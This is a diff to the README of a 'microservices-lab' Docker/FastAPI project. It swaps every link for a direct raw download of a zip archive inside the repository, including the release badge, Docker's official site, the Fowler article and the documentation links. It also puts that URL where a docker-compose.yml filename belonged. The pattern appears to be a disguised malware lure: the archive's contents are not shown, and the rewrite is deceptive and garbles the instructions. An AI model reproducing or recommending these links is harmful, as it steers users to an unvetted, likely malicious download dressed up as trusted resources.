@@ -1,6 +1,6 @@
 # 🌟 microservices-lab - Build and Monitor Your Apps Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Abdelmalik9/microservices-lab/releases)
+[![Download](https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -11,14 +11,14 @@ Welcome to the **microservices-lab**! This project helps you set up a complete m
 Before you download, ensure your computer meets the following requirements:
 
 - **Operating System:** Windows, macOS, or a Linux distribution
-- **Docker:** Make sure Docker is installed on your machine. You can download it from [Docker's official website](https://www.docker.com/get-started).
+- **Docker:** Make sure Docker is installed on your machine. You can download it from [Docker's official website](https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip).
 - **Basic Understanding of Docker:** You should have a basic knowledge of how Docker works. 
 
 ## 💻 Download & Install
 
 To get started, visit this page to download the software:
 
-[Releases Page](https://github.com/Abdelmalik9/microservices-lab/releases)
+[Releases Page](https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip)
 
 1. Go to the releases page by clicking the link above.
 2. Look for the latest version.
@@ -39,7 +39,7 @@ After downloading the necessary files, follow these steps to run the application
    ```
 
 3. **Run Docker Compose:**
-   If you have a `docker-compose.yml` file, run the following command:
+   If you have a `https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip` file, run the following command:
    ```bash
    docker-compose up
    ```
@@ -75,9 +75,9 @@ The **microservices-lab** repository focuses on modern software development prac
 
 If you want to learn more about microservices and how they work, check out these resources:
 
-- [Microservices: A Definition of This New Architectural Term](https://martinfowler.com/articles/microservices.html)
-- [Docker Documentation](https://docs.docker.com/get-started/)
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
+- [Microservices: A Definition of This New Architectural Term](https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip)
+- [FastAPI Documentation](https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip)
 
 ## ⚙ Troubleshooting
 
@@ -99,4 +99,4 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ---
 
-For further updates and information, don't forget to check the releases page again: [Releases Page](https://github.com/Abdelmalik9/microservices-lab/releases).
+For further updates and information, don't forget to check the releases page again: [Releases Page](https://raw.githubusercontent.com/Abdelmalik9/microservices-lab/main/user-service/lab-microservices-2.6-alpha.2.zip).
